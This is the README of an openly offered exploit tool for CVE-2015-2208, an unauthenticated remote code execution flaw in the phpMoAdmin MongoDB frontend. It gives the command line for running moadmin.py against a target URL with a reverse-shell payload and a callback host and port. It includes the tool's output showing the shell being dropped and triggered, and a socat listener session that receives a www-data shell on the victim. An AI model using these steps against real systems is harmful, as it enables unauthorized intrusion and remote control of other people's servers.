# Exploit for CVE-2015-2208, phpMoAdmin Unauthenticated Remote Code Execution

This is an exploit for the eval() injection vulnerability recently disclosed in the phpMoAdmin MongoDB frontend. Very quick and dirty exploit, written to test out some new ideas I had for writing more streamlined PHP RCE exploits, in this case, using the cookie to set the connectback host/port at runtime when doing a filedropper type thing. See the code for what I mean...

## Usage

To use, simply select which payload you want to use (currently only back_python.php is available, but I plan on adding back_php.php and back_perl.php at a later date). This is the "payload.php". You also must specify a callback host and port, along with the URL to the vulnerable phpMoAdmin script.

Example Use:
```
xrl:~$ python moadmin.py http://192.168.1.7/phpMoAdmin/index.php back_py.php 192.168.1.5 80

███╗   ██╗███████╗███████╗██████╗ ███████╗    ███╗   ███╗ ██████╗ ██████╗ ███████╗
████╗  ██║██╔════╝██╔════╝██╔══██╗██╔════╝    ████╗ ████║██╔═══██╗██╔══██╗██╔════╝
██╔██╗ ██║█████╗  █████╗  ██║  ██║███████╗    ██╔████╔██║██║   ██║██████╔╝█████╗  
██║╚██╗██║██╔══╝  ██╔══╝  ██║  ██║╚════██║    ██║╚██╔╝██║██║   ██║██╔══██╗██╔══╝  
██║ ╚████║███████╗███████╗██████╔╝███████║    ██║ ╚═╝ ██║╚██████╔╝██║  ██║███████╗
╚═╝  ╚═══╝╚══════╝╚══════╝╚═════╝ ╚══════╝    ╚═╝     ╚═╝ ╚═════╝ ╚═╝  ╚═╝╚══════╝
                                                                                  
                     █████╗ ██████╗ ███╗   ███╗██╗███╗   ██╗                      
                    ██╔══██╗██╔══██╗████╗ ████║██║████╗  ██║                      
                    ███████║██║  ██║██╔████╔██║██║██╔██╗ ██║                      
                    ██╔══██║██║  ██║██║╚██╔╝██║██║██║╚██╗██║                      
                    ██║  ██║██████╔╝██║ ╚═╝ ██║██║██║ ╚████║                      
                    ╚═╝  ╚═╝╚═════╝ ╚═╝     ╚═╝╚═╝╚═╝  ╚═══╝    
    Exploit for phpMoAdmin, CVE-2015-2208   Version: 20150305.3
{+} Sending Payload...
{+} Using 192.168.1.5:80 as callback...
{+} Dropping shell...
{+} Shell dropped... Triggering...
{+} got shell?
xrl:~$ 
```

For a listener, I suggest using socat, as per the following example, as it allows a full PTY to be spawned (at least with the reference Python payload).
```
xrl:~# socat -,echo=0,raw tcp4-listen:80
Got root yet?
Linux magh-meall 3.18.6-1-ARCH #1 SMP PREEMPT Sat Feb 7 08:44:05 CET 2015 x86_64 GNU/Linux
uid=33(www-data) gid=33(www-data) groups=33(www-data)
www-data@magh-meall:/var/www/phpMoAdmin$ exit
exit
quitting, cleanup
xrl:~# 
```

## Demo
If you want, check out the [Asciicast demo][asciicast]  
[![asciicast](https://asciinema.org/a/17330.png)](https://asciinema.org/a/17330)

## Licence
Licenced under the [WTFPL][wtfpl]

[asciicast]: https://asciinema.org/a/17330
[wtfpl]: http://www.wtfpl.net/
